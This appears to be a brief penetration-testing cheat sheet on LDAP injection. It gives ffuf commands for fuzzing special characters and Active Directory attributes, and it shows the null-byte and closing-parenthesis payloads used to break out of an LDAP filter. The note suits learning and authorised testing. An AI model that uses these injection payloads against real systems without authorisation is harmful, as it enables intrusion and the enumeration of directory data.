# LDAP Injection

## Indicator

```powershell
ffuf -w /usr/share/seclists/Fuzzing/special-chars.txt -u 'http://example.com?param=FUZZ'
```

**Output:**

```
*                      [Status: 200, ...]
(                      [Status: 200, ...]
\                      [Status: 200, ...]
)                      [Status: 200, ...]
```

## Methodology

End with null byte (`%00`), add `)` progressively to understand the context of the query

IppSec's video [here](https://youtube.com/watch?v=51JQg202csw&t=885)

Null byte in ldap is the equivalent to a comment in SQL injection, terminating the statement

Example query

```
(&
	(name=technician)
)
```

Adding the null byte wipes out everything after it, so applying our methodology in this example reveals that we need to add 2 `)` to get expected output and not break the site:

```
(&
	(name=technician))%00
```

We can now fuzz attributes with the following example

```powershell
ffuf -w /usr/share/seclists/Fuzzing/LDAP-active-directory-attributes.txt -u 'http://$IP/vulnerable.php?param=val)(FUZZ%3d*' -ms 418
```

We match size of 418 cause this is output size matches where the website doesnt break and provides expected output.
